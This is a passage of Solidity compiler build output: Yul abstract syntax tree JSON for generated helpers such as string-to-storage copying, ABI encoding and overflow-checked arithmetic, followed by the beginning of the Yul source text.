:10","nodeType":"YulIdentifier","src":"6160:2:10"},"nativeSrc":"6160:14:10","nodeType":"YulFunctionCall","src":"6160:14:10"},"nativeSrc":"6152:208:10","nodeType":"YulForLoop","post":{"nativeSrc":"6175:21:10","nodeType":"YulBlock","src":"6175:21:10","statements":[{"nativeSrc":"6177:17:10","nodeType":"YulAssignment","src":"6177:17:10","value":{"arguments":[{"name":"i","nativeSrc":"6186:1:10","nodeType":"YulIdentifier","src":"6186:1:10"},{"kind":"number","nativeSrc":"6189:4:10","nodeType":"YulLiteral","src":"6189:4:10","type":"","value":"0x20"}],"functionName":{"name":"add","nativeSrc":"6182:3:10","nodeType":"YulIdentifier","src":"6182:3:10"},"nativeSrc":"6182:12:10","nodeType":"YulFunctionCall","src":"6182:12:10"},"variableNames":[{"name":"i","nativeSrc":"6177:1:10","nodeType":"YulIdentifier","src":"6177:1:10"}]}]},"pre":{"nativeSrc":"6156:3:10","nodeType":"YulBlock","src":"6156:3:10","statements":[]},"src":"6152:208:10"},{"body":{"nativeSrc":"6396:156:10","nodeType":"YulBlock","src":"6396:156:10","statements":[{"nativeSrc":"6414:43:10","nodeType":"YulVariableDeclaration","src":"6414:43:10","value":{"arguments":[{"arguments":[{"name":"src","nativeSrc":"6441:3:10","nodeType":"YulIdentifier","src":"6441:3:10"},{"name":"srcOffset","nativeSrc":"6446:9:10","nodeType":"YulIdentifier","src":"6446:9:10"}],"functionName":{"name":"add","nativeSrc":"6437:3:10","nodeType":"YulIdentifier","src":"6437:3:10"},"nativeSrc":"6437:19:10","nodeType":"YulFunctionCall","src":"6437:19:10"}],"functionName":{"name":"mload","nativeSrc":"6431:5:10","nodeType":"YulIdentifier","src":"6431:5:10"},"nativeSrc":"6431:26:10","nodeType":"YulFunctionCall","src":"6431:26:10"},"variables":[{"name":"lastValue","nativeSrc":"6418:9:10","nodeType":"YulTypedName","src":"6418:9:10","type":""}]},{"expression":{"arguments":[{"name":"dstPtr","nativeSrc":"6481:6:10","nodeType":"YulIdentifier","src":"6481:6:10"},{"arguments":[{"name":"lastValue","nativeSrc":"6508:9:10","nodeType":"YulIdentifier","src":"6508:9:10"},{"arguments":[{"name":"newLen","nativeSrc":"6523:6:10","nodeType":"YulIdentifier","src":"6523:6:10"},{"kind":"number","nativeSrc":"6531:4:10","nodeType":"YulLiteral","src":"6531:4:10","type":"","value":"0x1f"}],"functionName":{"name":"and","nativeSrc":"6519:3:10","nodeType":"YulIdentifier","src":"6519:3:10"},"nativeSrc":"6519:17:10","nodeType":"YulFunctionCall","src":"6519:17:10"}],"functionName":{"name":"mask_bytes_dynamic","nativeSrc":"6489:18:10","nodeType":"YulIdentifier","src":"6489:18:10"},"nativeSrc":"6489:48:10","nodeType":"YulFunctionCall","src":"6489:48:10"}],"functionName":{"name":"sstore","nativeSrc":"6474:6:10","nodeType":"YulIdentifier","src":"6474:6:10"},"nativeSrc":"6474:64:10","nodeType":"YulFunctionCall","src":"6474:64:10"},"nativeSrc":"6474:64:10","nodeType":"YulExpressionStatement","src":"6474:64:10"}]},"condition":{"arguments":[{"name":"loopEnd","nativeSrc":"6379:7:10","nodeType":"YulIdentifier","src":"6379:7:10"},{"name":"newLen","nativeSrc":"6388:6:10","nodeType":"YulIdentifier","src":"6388:6:10"}],"functionName":{"name":"lt","nativeSrc":"6376:2:10","nodeType":"YulIdentifier","src":"6376:2:10"},"nativeSrc":"6376:19:10","nodeType":"YulFunctionCall","src":"6376:19:10"},"nativeSrc":"6373:179:10","nodeType":"YulIf","src":"6373:179:10"},{"expression":{"arguments":[{"name":"slot","nativeSrc":"6572:4:10","nodeType":"YulIdentifier","src":"6572:4:10"},{"arguments":[{"arguments":[{"name":"newLen","nativeSrc":"6586:6:10","nodeType":"YulIdentifier","src":"6586:6:10"},{"kind":"number","nativeSrc":"6594:1:10","nodeType":"YulLiteral","src":"6594:1:10","type":"","value":"2"}],"functionName":{"name":"mul","nativeSrc":"6582:3:10","nodeType":"YulIdentifier","src":"6582:3:10"},"nativeSrc":"6582:14:10","nodeType":"YulFunctionCall","src":"6582:14:10"},{"kind":"number","nativeSrc":"6598:1:10","nodeType":"YulLiteral","src":"6598:1:10","type":"","value":"1"}],"functionName":{"name":"add","nativeSrc":"6578:3:10","nodeType":"YulIdentifier","src":"6578:3:10"},"nativeSrc":"6578:22:10","nodeType":"YulFunctionCall","src":"6578:22:10"}],"functionName":{"name":"sstore","nativeSrc":"6565:6:10","nodeType":"YulIdentifier","src":"6565:6:10"},"nativeSrc":"6565:36:10","nodeType":"YulFunctionCall","src":"6565:36:10"},"nativeSrc":"6565:36:10","nodeType":"YulExpressionStatement","src":"6565:36:10"}]},"nativeSrc":"5993:618:10","nodeType":"YulCase","src":"5993:618:10","value":{"kind":"number","nativeSrc":"5998:1:10","nodeType":"YulLiteral","src":"5998:1:10","type":"","value":"1"}},{"body":{"nativeSrc":"6628:222:10","nodeType":"YulBlock","src":"6628:222:10","statements":[{"nativeSrc":"6642:14:10","nodeType":"YulVariableDeclaration","src":"6642:14:10","value":{"kind":"number","nativeSrc":"6655:1:10","nodeType":"YulLiteral","src":"6655:1:10","type":"","value":"0"},"variables":[{"name":"value","nativeSrc":"6646:5:10","nodeType":"YulTypedName","src":"6646:5:10","type":""}]},{"body":{"nativeSrc":"6679:67:10","nodeType":"YulBlock","src":"6679:67:10","statements":[{"nativeSrc":"6697:35:10","nodeType":"YulAssignment","src":"6697:35:10","value":{"arguments":[{"arguments":[{"name":"src","nativeSrc":"6716:3:10","nodeType":"YulIdentifier","src":"6716:3:10"},{"name":"srcOffset","nativeSrc":"6721:9:10","nodeType":"YulIdentifier","src":"6721:9:10"}],"functionName":{"name":"add","nativeSrc":"6712:3:10","nodeType":"YulIdentifier","src":"6712:3:10"},"nativeSrc":"6712:19:10","nodeType":"YulFunctionCall","src":"6712:19:10"}],"functionName":{"name":"mload","nativeSrc":"6706:5:10","nodeType":"YulIdentifier","src":"6706:5:10"},"nativeSrc":"6706:26:10","nodeType":"YulFunctionCall","src":"6706:26:10"},"variableNames":[{"name":"value","nativeSrc":"6697:5:10","nodeType":"YulIdentifier","src":"6697:5:10"}]}]},"condition":{"name":"newLen","nativeSrc":"6672:6:10","nodeType":"YulIdentifier","src":"6672:6:10"},"nativeSrc":"6669:77:10","nodeType":"YulIf","src":"6669:77:10"},{"expression":{"arguments":[{"name":"slot","nativeSrc":"6766:4:10","nodeType":"YulIdentifier","src":"6766:4:10"},{"arguments":[{"name":"value","nativeSrc":"6825:5:10","nodeType":"YulIdentifier","src":"6825:5:10"},{"name":"newLen","nativeSrc":"6832:6:10","nodeType":"YulIdentifier","src":"6832:6:10"}],"functionName":{"name":"extract_used_part_and_set_length_of_short_byte_array","nativeSrc":"6772:52:10","nodeType":"YulIdentifier","src":"6772:52:10"},"nativeSrc":"6772:67:10","nodeType":"YulFunctionCall","src":"6772:67:10"}],"functionName":{"name":"sstore","nativeSrc":"6759:6:10","nodeType":"YulIdentifier","src":"6759:6:10"},"nativeSrc":"6759:81:10","nodeType":"YulFunctionCall","src":"6759:81:10"},"nativeSrc":"6759:81:10","nodeType":"YulExpressionStatement","src":"6759:81:10"}]},"nativeSrc":"6620:230:10","nodeType":"YulCase","src":"6620:230:10","value":"default"}],"expression":{"arguments":[{"name":"newLen","nativeSrc":"5973:6:10","nodeType":"YulIdentifier","src":"5973:6:10"},{"kind":"number","nativeSrc":"5981:2:10","nodeType":"YulLiteral","src":"5981:2:10","type":"","value":"31"}],"functionName":{"name":"gt","nativeSrc":"5970:2:10","nodeType":"YulIdentifier","src":"5970:2:10"},"nativeSrc":"5970:14:10","nodeType":"YulFunctionCall","src":"5970:14:10"},"nativeSrc":"5963:887:10","nodeType":"YulSwitch","src":"5963:887:10"}]},"name":"copy_byte_array_to_storage_from_t_string_memory_ptr_to_t_string_storage","nativeSrc":"5461:1395:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"slot","nativeSrc":"5542:4:10","nodeType":"YulTypedName","src":"5542:4:10","type":""},{"name":"src","nativeSrc":"5548:3:10","nodeType":"YulTypedName","src":"5548:3:10","type":""}],"src":"5461:1395:10"},{"body":{"nativeSrc":"6927:53:10","nodeType":"YulBlock","src":"6927:53:10","statements":[{"expression":{"arguments":[{"name":"pos","nativeSrc":"6944:3:10","nodeType":"YulIdentifier","src":"6944:3:10"},{"arguments":[{"name":"value","nativeSrc":"6967:5:10","nodeType":"YulIdentifier","src":"6967:5:10"}],"functionName":{"name":"cleanup_t_address","nativeSrc":"6949:17:10","nodeType":"YulIdentifier","src":"6949:17:10"},"nativeSrc":"6949:24:10","nodeType":"YulFunctionCall","src":"6949:24:10"}],"functionName":{"name":"mstore","nativeSrc":"6937:6:10","nodeType":"YulIdentifier","src":"6937:6:10"},"nativeSrc":"6937:37:10","nodeType":"YulFunctionCall","src":"6937:37:10"},"nativeSrc":"6937:37:10","nodeType":"YulExpressionStatement","src":"6937:37:10"}]},"name":"abi_encode_t_address_to_t_address_fromStack","nativeSrc":"6862:118:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"6915:5:10","nodeType":"YulTypedName","src":"6915:5:10","type":""},{"name":"pos","nativeSrc":"6922:3:10","nodeType":"YulTypedName","src":"6922:3:10","type":""}],"src":"6862:118:10"},{"body":{"nativeSrc":"7084:124:10","nodeType":"YulBlock","src":"7084:124:10","statements":[{"nativeSrc":"7094:26:10","nodeType":"YulAssignment","src":"7094:26:10","value":{"arguments":[{"name":"headStart","nativeSrc":"7106:9:10","nodeType":"YulIdentifier","src":"7106:9:10"},{"kind":"number","nativeSrc":"7117:2:10","nodeType":"YulLiteral","src":"7117:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"7102:3:10","nodeType":"YulIdentifier","src":"7102:3:10"},"nativeSrc":"7102:18:10","nodeType":"YulFunctionCall","src":"7102:18:10"},"variableNames":[{"name":"tail","nativeSrc":"7094:4:10","nodeType":"YulIdentifier","src":"7094:4:10"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"7174:6:10","nodeType":"YulIdentifier","src":"7174:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"7187:9:10","nodeType":"YulIdentifier","src":"7187:9:10"},{"kind":"number","nativeSrc":"7198:1:10","nodeType":"YulLiteral","src":"7198:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"7183:3:10","nodeType":"YulIdentifier","src":"7183:3:10"},"nativeSrc":"7183:17:10","nodeType":"YulFunctionCall","src":"7183:17:10"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nativeSrc":"7130:43:10","nodeType":"YulIdentifier","src":"7130:43:10"},"nativeSrc":"7130:71:10","nodeType":"YulFunctionCall","src":"7130:71:10"},"nativeSrc":"7130:71:10","nodeType":"YulExpressionStatement","src":"7130:71:10"}]},"name":"abi_encode_tuple_t_address__to_t_address__fromStack_reversed","nativeSrc":"6986:222:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"7056:9:10","nodeType":"YulTypedName","src":"7056:9:10","type":""},{"name":"value0","nativeSrc":"7068:6:10","nodeType":"YulTypedName","src":"7068:6:10","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"7079:4:10","nodeType":"YulTypedName","src":"7079:4:10","type":""}],"src":"6986:222:10"},{"body":{"nativeSrc":"7242:152:10","nodeType":"YulBlock","src":"7242:152:10","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"7259:1:10","nodeType":"YulLiteral","src":"7259:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"7262:77:10","nodeType":"YulLiteral","src":"7262:77:10","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nativeSrc":"7252:6:10","nodeType":"YulIdentifier","src":"7252:6:10"},"nativeSrc":"7252:88:10","nodeType":"YulFunctionCall","src":"7252:88:10"},"nativeSrc":"7252:88:10","nodeType":"YulExpressionStatement","src":"7252:88:10"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"7356:1:10","nodeType":"YulLiteral","src":"7356:1:10","type":"","value":"4"},{"kind":"number","nativeSrc":"7359:4:10","nodeType":"YulLiteral","src":"7359:4:10","type":"","value":"0x11"}],"functionName":{"name":"mstore","nativeSrc":"7349:6:10","nodeType":"YulIdentifier","src":"7349:6:10"},"nativeSrc":"7349:15:10","nodeType":"YulFunctionCall","src":"7349:15:10"},"nativeSrc":"7349:15:10","nodeType":"YulExpressionStatement","src":"7349:15:10"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"7380:1:10","nodeType":"YulLiteral","src":"7380:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"7383:4:10","nodeType":"YulLiteral","src":"7383:4:10","type":"","value":"0x24"}],"functionName":{"name":"revert","nativeSrc":"7373:6:10","nodeType":"YulIdentifier","src":"7373:6:10"},"nativeSrc":"7373:15:10","nodeType":"YulFunctionCall","src":"7373:15:10"},"nativeSrc":"7373:15:10","nodeType":"YulExpressionStatement","src":"7373:15:10"}]},"name":"panic_error_0x11","nativeSrc":"7214:180:10","nodeType":"YulFunctionDefinition","src":"7214:180:10"},{"body":{"nativeSrc":"7448:362:10","nodeType":"YulBlock","src":"7448:362:10","statements":[{"nativeSrc":"7458:25:10","nodeType":"YulAssignment","src":"7458:25:10","value":{"arguments":[{"name":"x","nativeSrc":"7481:1:10","nodeType":"YulIdentifier","src":"7481:1:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"7463:17:10","nodeType":"YulIdentifier","src":"7463:17:10"},"nativeSrc":"7463:20:10","nodeType":"YulFunctionCall","src":"7463:20:10"},"variableNames":[{"name":"x","nativeSrc":"7458:1:10","nodeType":"YulIdentifier","src":"7458:1:10"}]},{"nativeSrc":"7492:25:10","nodeType":"YulAssignment","src":"7492:25:10","value":{"arguments":[{"name":"y","nativeSrc":"7515:1:10","nodeType":"YulIdentifier","src":"7515:1:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"7497:17:10","nodeType":"YulIdentifier","src":"7497:17:10"},"nativeSrc":"7497:20:10","nodeType":"YulFunctionCall","src":"7497:20:10"},"variableNames":[{"name":"y","nativeSrc":"7492:1:10","nodeType":"YulIdentifier","src":"7492:1:10"}]},{"nativeSrc":"7526:28:10","nodeType":"YulVariableDeclaration","src":"7526:28:10","value":{"arguments":[{"name":"x","nativeSrc":"7549:1:10","nodeType":"YulIdentifier","src":"7549:1:10"},{"name":"y","nativeSrc":"7552:1:10","nodeType":"YulIdentifier","src":"7552:1:10"}],"functionName":{"name":"mul","nativeSrc":"7545:3:10","nodeType":"YulIdentifier","src":"7545:3:10"},"nativeSrc":"7545:9:10","nodeType":"YulFunctionCall","src":"7545:9:10"},"variables":[{"name":"product_raw","nativeSrc":"7530:11:10","nodeType":"YulTypedName","src":"7530:11:10","type":""}]},{"nativeSrc":"7563:41:10","nodeType":"YulAssignment","src":"7563:41:10","value":{"arguments":[{"name":"product_raw","nativeSrc":"7592:11:10","nodeType":"YulIdentifier","src":"7592:11:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"7574:17:10","nodeType":"YulIdentifier","src":"7574:17:10"},"nativeSrc":"7574:30:10","nodeType":"YulFunctionCall","src":"7574:30:10"},"variableNames":[{"name":"product","nativeSrc":"7563:7:10","nodeType":"YulIdentifier","src":"7563:7:10"}]},{"body":{"nativeSrc":"7781:22:10","nodeType":"YulBlock","src":"7781:22:10","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x11","nativeSrc":"7783:16:10","nodeType":"YulIdentifier","src":"7783:16:10"},"nativeSrc":"7783:18:10","nodeType":"YulFunctionCall","src":"7783:18:10"},"nativeSrc":"7783:18:10","nodeType":"YulExpressionStatement","src":"7783:18:10"}]},"condition":{"arguments":[{"arguments":[{"arguments":[{"name":"x","nativeSrc":"7714:1:10","nodeType":"YulIdentifier","src":"7714:1:10"}],"functionName":{"name":"iszero","nativeSrc":"7707:6:10","nodeType":"YulIdentifier","src":"7707:6:10"},"nativeSrc":"7707:9:10","nodeType":"YulFunctionCall","src":"7707:9:10"},{"arguments":[{"name":"y","nativeSrc":"7737:1:10","nodeType":"YulIdentifier","src":"7737:1:10"},{"arguments":[{"name":"product","nativeSrc":"7744:7:10","nodeType":"YulIdentifier","src":"7744:7:10"},{"name":"x","nativeSrc":"7753:1:10","nodeType":"YulIdentifier","src":"7753:1:10"}],"functionName":{"name":"div","nativeSrc":"7740:3:10","nodeType":"YulIdentifier","src":"7740:3:10"},"nativeSrc":"7740:15:10","nodeType":"YulFunctionCall","src":"7740:15:10"}],"functionName":{"name":"eq","nativeSrc":"7734:2:10","nodeType":"YulIdentifier","src":"7734:2:10"},"nativeSrc":"7734:22:10","nodeType":"YulFunctionCall","src":"7734:22:10"}],"functionName":{"name":"or","nativeSrc":"7687:2:10","nodeType":"YulIdentifier","src":"7687:2:10"},"nativeSrc":"7687:83:10","nodeType":"YulFunctionCall","src":"7687:83:10"}],"functionName":{"name":"iszero","nativeSrc":"7667:6:10","nodeType":"YulIdentifier","src":"7667:6:10"},"nativeSrc":"7667:113:10","nodeType":"YulFunctionCall","src":"7667:113:10"},"nativeSrc":"7664:139:10","nodeType":"YulIf","src":"7664:139:10"}]},"name":"checked_mul_t_uint256","nativeSrc":"7400:410:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"x","nativeSrc":"7431:1:10","nodeType":"YulTypedName","src":"7431:1:10","type":""},{"name":"y","nativeSrc":"7434:1:10","nodeType":"YulTypedName","src":"7434:1:10","type":""}],"returnVariables":[{"name":"product","nativeSrc":"7440:7:10","nodeType":"YulTypedName","src":"7440:7:10","type":""}],"src":"7400:410:10"},{"body":{"nativeSrc":"7860:147:10","nodeType":"YulBlock","src":"7860:147:10","statements":[{"nativeSrc":"7870:25:10","nodeType":"YulAssignment","src":"7870:25:10","value":{"arguments":[{"name":"x","nativeSrc":"7893:1:10","nodeType":"YulIdentifier","src":"7893:1:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"7875:17:10","nodeType":"YulIdentifier","src":"7875:17:10"},"nativeSrc":"7875:20:10","nodeType":"YulFunctionCall","src":"7875:20:10"},"variableNames":[{"name":"x","nativeSrc":"7870:1:10","nodeType":"YulIdentifier","src":"7870:1:10"}]},{"nativeSrc":"7904:25:10","nodeType":"YulAssignment","src":"7904:25:10","value":{"arguments":[{"name":"y","nativeSrc":"7927:1:10","nodeType":"YulIdentifier","src":"7927:1:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"7909:17:10","nodeType":"YulIdentifier","src":"7909:17:10"},"nativeSrc":"7909:20:10","nodeType":"YulFunctionCall","src":"7909:20:10"},"variableNames":[{"name":"y","nativeSrc":"7904:1:10","nodeType":"YulIdentifier","src":"7904:1:10"}]},{"nativeSrc":"7938:16:10","nodeType":"YulAssignment","src":"7938:16:10","value":{"arguments":[{"name":"x","nativeSrc":"7949:1:10","nodeType":"YulIdentifier","src":"7949:1:10"},{"name":"y","nativeSrc":"7952:1:10","nodeType":"YulIdentifier","src":"7952:1:10"}],"functionName":{"name":"add","nativeSrc":"7945:3:10","nodeType":"YulIdentifier","src":"7945:3:10"},"nativeSrc":"7945:9:10","nodeType":"YulFunctionCall","src":"7945:9:10"},"variableNames":[{"name":"sum","nativeSrc":"7938:3:10","nodeType":"YulIdentifier","src":"7938:3:10"}]},{"body":{"nativeSrc":"7978:22:10","nodeType":"YulBlock","src":"7978:22:10","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x11","nativeSrc":"7980:16:10","nodeType":"YulIdentifier","src":"7980:16:10"},"nativeSrc":"7980:18:10","nodeType":"YulFunctionCall","src":"7980:18:10"},"nativeSrc":"7980:18:10","nodeType":"YulExpressionStatement","src":"7980:18:10"}]},"condition":{"arguments":[{"name":"x","nativeSrc":"7970:1:10","nodeType":"YulIdentifier","src":"7970:1:10"},{"name":"sum","nativeSrc":"7973:3:10","nodeType":"YulIdentifier","src":"7973:3:10"}],"functionName":{"name":"gt","nativeSrc":"7967:2:10","nodeType":"YulIdentifier","src":"7967:2:10"},"nativeSrc":"7967:10:10","nodeType":"YulFunctionCall","src":"7967:10:10"},"nativeSrc":"7964:36:10","nodeType":"YulIf","src":"7964:36:10"}]},"name":"checked_add_t_uint256","nativeSrc":"7816:191:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"x","nativeSrc":"7847:1:10","nodeType":"YulTypedName","src":"7847:1:10","type":""},{"name":"y","nativeSrc":"7850:1:10","nodeType":"YulTypedName","src":"7850:1:10","type":""}],"returnVariables":[{"name":"sum","nativeSrc":"7856:3:10","nodeType":"YulTypedName","src":"7856:3:10","type":""}],"src":"7816:191:10"},{"body":{"nativeSrc":"8078:53:10","nodeType":"YulBlock","src":"8078:53:10","statements":[{"expression":{"arguments":[{"name":"pos","nativeSrc":"8095:3:10","nodeType":"YulIdentifier","src":"8095:3:10"},{"arguments":[{"name":"value","nativeSrc":"8118:5:10","nodeType":"YulIdentifier","src":"8118:5:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"8100:17:10","nodeType":"YulIdentifier","src":"8100:17:10"},"nativeSrc":"8100:24:10","nodeType":"YulFunctionCall","src":"8100:24:10"}],"functionName":{"name":"mstore","nativeSrc":"8088:6:10","nodeType":"YulIdentifier","src":"8088:6:10"},"nativeSrc":"8088:37:10","nodeType":"YulFunctionCall","src":"8088:37:10"},"nativeSrc":"8088:37:10","nodeType":"YulExpressionStatement","src":"8088:37:10"}]},"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"8013:118:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"8066:5:10","nodeType":"YulTypedName","src":"8066:5:10","type":""},{"name":"pos","nativeSrc":"8073:3:10","nodeType":"YulTypedName","src":"8073:3:10","type":""}],"src":"8013:118:10"},{"body":{"nativeSrc":"8291:288:10","nodeType":"YulBlock","src":"8291:288:10","statements":[{"nativeSrc":"8301:26:10","nodeType":"YulAssignment","src":"8301:26:10","value":{"arguments":[{"name":"headStart","nativeSrc":"8313:9:10","nodeType":"YulIdentifier","src":"8313:9:10"},{"kind":"number","nativeSrc":"8324:2:10","nodeType":"YulLiteral","src":"8324:2:10","type":"","value":"96"}],"functionName":{"name":"add","nativeSrc":"8309:3:10","nodeType":"YulIdentifier","src":"8309:3:10"},"nativeSrc":"8309:18:10","nodeType":"YulFunctionCall","src":"8309:18:10"},"variableNames":[{"name":"tail","nativeSrc":"8301:4:10","nodeType":"YulIdentifier","src":"8301:4:10"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"8381:6:10","nodeType":"YulIdentifier","src":"8381:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"8394:9:10","nodeType":"YulIdentifier","src":"8394:9:10"},{"kind":"number","nativeSrc":"8405:1:10","nodeType":"YulLiteral","src":"8405:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"8390:3:10","nodeType":"YulIdentifier","src":"8390:3:10"},"nativeSrc":"8390:17:10","nodeType":"YulFunctionCall","src":"8390:17:10"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nativeSrc":"8337:43:10","nodeType":"YulIdentifier","src":"8337:43:10"},"nativeSrc":"8337:71:10","nodeType":"YulFunctionCall","src":"8337:71:10"},"nativeSrc":"8337:71:10","nodeType":"YulExpressionStatement","src":"8337:71:10"},{"expression":{"arguments":[{"name":"value1","nativeSrc":"8462:6:10","nodeType":"YulIdentifier","src":"8462:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"8475:9:10","nodeType":"YulIdentifier","src":"8475:9:10"},{"kind":"number","nativeSrc":"8486:2:10","nodeType":"YulLiteral","src":"8486:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"8471:3:10","nodeType":"YulIdentifier","src":"8471:3:10"},"nativeSrc":"8471:18:10","nodeType":"YulFunctionCall","src":"8471:18:10"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"8418:43:10","nodeType":"YulIdentifier","src":"8418:43:10"},"nativeSrc":"8418:72:10","nodeType":"YulFunctionCall","src":"8418:72:10"},"nativeSrc":"8418:72:10","nodeType":"YulExpressionStatement","src":"8418:72:10"},{"expression":{"arguments":[{"name":"value2","nativeSrc":"8544:6:10","nodeType":"YulIdentifier","src":"8544:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"8557:9:10","nodeType":"YulIdentifier","src":"8557:9:10"},{"kind":"number","nativeSrc":"8568:2:10","nodeType":"YulLiteral","src":"8568:2:10","type":"","value":"64"}],"functionName":{"name":"add","nativeSrc":"8553:3:10","nodeType":"YulIdentifier","src":"8553:3:10"},"nativeSrc":"8553:18:10","nodeType":"YulFunctionCall","src":"8553:18:10"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"8500:43:10","nodeType":"YulIdentifier","src":"8500:43:10"},"nativeSrc":"8500:72:10","nodeType":"YulFunctionCall","src":"8500:72:10"},"nativeSrc":"8500:72:10","nodeType":"YulExpressionStatement","src":"8500:72:10"}]},"name":"abi_encode_tuple_t_address_t_uint256_t_uint256__to_t_address_t_uint256_t_uint256__fromStack_reversed","nativeSrc":"8137:442:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"8247:9:10","nodeType":"YulTypedName","src":"8247:9:10","type":""},{"name":"value2","nativeSrc":"8259:6:10","nodeType":"YulTypedName","src":"8259:6:10","type":""},{"name":"value1","nativeSrc":"8267:6:10","nodeType":"YulTypedName","src":"8267:6:10","type":""},{"name":"value0","nativeSrc":"8275:6:10","nodeType":"YulTypedName","src":"8275:6:10","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"8286:4:10","nodeType":"YulTypedName","src":"8286:4:10","type":""}],"src":"8137:442:10"},{"body":{"nativeSrc":"8683:124:10","nodeType":"YulBlock","src":"8683:124:10","statements":[{"nativeSrc":"8693:26:10","nodeType":"YulAssignment","src":"8693:26:10","value":{"arguments":[{"name":"headStart","nativeSrc":"8705:9:10","nodeType":"YulIdentifier","src":"8705:9:10"},{"kind":"number","nativeSrc":"8716:2:10","nodeType":"YulLiteral","src":"8716:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"8701:3:10","nodeType":"YulIdentifier","src":"8701:3:10"},"nativeSrc":"8701:18:10","nodeType":"YulFunctionCall","src":"8701:18:10"},"variableNames":[{"name":"tail","nativeSrc":"8693:4:10","nodeType":"YulIdentifier","src":"8693:4:10"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"8773:6:10","nodeType":"YulIdentifier","src":"8773:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"8786:9:10","nodeType":"YulIdentifier","src":"8786:9:10"},{"kind":"number","nativeSrc":"8797:1:10","nodeType":"YulLiteral","src":"8797:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"8782:3:10","nodeType":"YulIdentifier","src":"8782:3:10"},"nativeSrc":"8782:17:10","nodeType":"YulFunctionCall","src":"8782:17:10"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"8729:43:10","nodeType":"YulIdentifier","src":"8729:43:10"},"nativeSrc":"8729:71:10","nodeType":"YulFunctionCall","src":"8729:71:10"},"nativeSrc":"8729:71:10","nodeType":"YulExpressionStatement","src":"8729:71:10"}]},"name":"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed","nativeSrc":"8585:222:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"8655:9:10","nodeType":"YulTypedName","src":"8655:9:10","type":""},{"name":"value0","nativeSrc":"8667:6:10","nodeType":"YulTypedName","src":"8667:6:10","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"8678:4:10","nodeType":"YulTypedName","src":"8678:4:10","type":""}],"src":"8585:222:10"}]},"contents":"{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function validator_revert_t_uint256(value) {\n        if iszero(eq(value, cleanup_t_uint256(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_uint256_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_uint256(value)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_uint256t_address_fromMemory(headStart, dataEnd) -> value0, value1 {\n        if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_uint256_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function array_length_t_string_memory_ptr(value) -> length {\n\n        length := mload(value)\n\n    }\n\n    function panic_error_0x41() {\n        mstore(0, 